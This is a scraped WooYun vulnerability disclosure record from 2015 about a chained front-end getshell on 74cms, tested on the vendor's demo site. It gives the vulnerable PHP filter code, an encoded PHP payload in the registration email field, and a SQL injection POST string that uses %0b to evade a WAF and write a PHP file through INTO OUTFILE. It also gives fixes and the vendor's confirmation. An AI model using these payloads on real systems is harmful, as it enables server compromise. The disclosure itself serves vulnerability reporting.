{"id": 15834, "wybug_id": "wooyun-2015-0107901", "wybug_title": "骑士CMS多漏洞组合前台GETSHELL(官网demo测试)", "wybug_corp": "74c,s.com", "wybug_author": "龟兔赛跑", "wybug_date": "2015-04-15 11:13", "wybug_open_date": "2015-07-18 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-18：\t细节向公众公开  简要描述： 骑士CMS多漏洞组合前台GETSHELL(官网demo测试)http://demo.74cms.com/ 详细说明：  通过SQL注入加上select * from table into outfile \"filename\"来完成SHELL的写入。必要条件：   1. SQL注入。   2. Server的文件保存路径。   3. 具有写权限的目录。   4. 还有一个是74cms会过滤‘“字符，我们需要有方法能注入’”来完成写入SHELL的SQL语句。以下逐条详细说明。0x01: SQL注入======================================我们有现成的，74cms一直忽略不修正的这个： WooYun: 74cms(20141020)全局SQL注入过滤绕过 （74cms全局SQL注入过滤绕过）。我们使用这个URL：\nhttp://demo.74cms.com/plus/ajax_user.php?act=check_usname\n0x02: Server的文件保存路径。======================================这个URL暴露了server的文件路径：\nhttp://demo.74cms.com/data/filetpl.php\n\n\n3. 具有写权限的目录。====================================== WooYun: 骑士CMS(20141027)多个漏洞组合可致所有数据泄露+getshell 曾经提到过，'data/'目录下很多上传文件的目录创建是0777权限建立的。注册一个公司用户，长传logo，这是会建立0777权限的目录：'data/logo/2015/04/14',shell就传到这个目录吧。4. 能带入‘“字符。======================================其实这个也很简单，’我们没办法注入。但是74cms提供了带入”的方法。文件：include/common.fun.php\n13  function addslashes_deep($value)  14  {  15      if (empty($value))  16      {  17          return $value;  18      }  19      else  20      {  21          if (!get_magic_quotes_gpc())  22          {  23          $value=is_array($value) ? array_map('addslashes_deep', $value) : mystrip_tags(addslashes($value));  24          }  25          else  26          {  27          $value=is_array($value) ? array_map('addslashes_deep', $value) : mystrip_tags($value);  28          }  29          return $value;  30      }  31  }  32  function mystrip_tags($string)  33  {  34      $string = new_html_special_chars($string);  35      $string = remove_xss($string);  36      return $string;  37  }  38  function new_html_special_chars($string) {  39      $string = str_replace(array('&amp;', '&quot;', '&lt;', '&gt;'), array('&', '\"', '<', '>'), $string);  40      $string = strip_tags($string);  41      return $string;  42  }\nnew_html_special_chars()函数做了这个事情：$string = str_replace(array('&amp;', '&quot;', '&lt;', '&gt;'), array('&', '\"', '<', '>'), $string);也就是在POST或者GET的参数中存在&quot;，都会被替换成\"。万事具备只欠东风。。。风儿那个吹阿吹。。。因为我们使用的是http://demo.74cms.com/plus/ajax_user.php?act=check_usname，这个是查询的用户表，因此我们还需要注册一个用户来带入shell脚本。注册用户:\n\n提交注册的时候使用burp拦截一下，我们改一下数据包：\n\n将payload的email字段改为：\n%3c%0b%3fphp+phpinfo()%3b+%3f%0b%3e\n WooYun: 骑士CMS全局XSS过滤绕过存储型XSS前台后台指哪打哪 介绍过<%0b...%0b>会被过滤为<...>提交注册成功之后我们在浏览器里面看看uid：\n\n注入生成SHELL：\nhttp://demo.74cms.com/plus/ajax_user.php?act=check_usnamePOST：usname=%88%ec%27 or uid=744%20in%0bto%20out%0bfile%20%26quot;D:%0b\\web\\demo\\data\\logo\\2015\\04\\14\\test.php%26quot;%23\n%0b会在全剧过滤的时候删除，所以我们利用这个特性绕过安全狗。执行后生成文件D:\\web\\demo\\data\\logo\\2015\\04\\14\\test.php浏览器浏览：http://demo.74cms.com/data/logo/2015/04/14/test.php\n\n   漏洞证明：  http://demo.74cms.com/data/logo/2015/04/14/test.php   修复方案：  1. utf8_to_gbk转换过的数据去要再次addslashs。2. 修复http://demo.74cms.com/data/filetpl.php暴露路径的问题   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-19 16:56 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-15 11:12 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  这个屌！    \n     2015-07-18 17:33 |    \t\t红糖哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:8        | 红糖暖胃不暖逼)\t\t \n  这个屌！    \n     2015-07-18 23:40 |    \t\t二维码 \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:4        | 老子跳起来就是个么么哒)\t\t \n  这个屌！    \n     2015-07-19 00:33 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  这个屌！    \n     2015-07-19 06:29 |    \t\tbobbi \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 人生真是寂寞如雪)\t\t \n  这个屌！     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}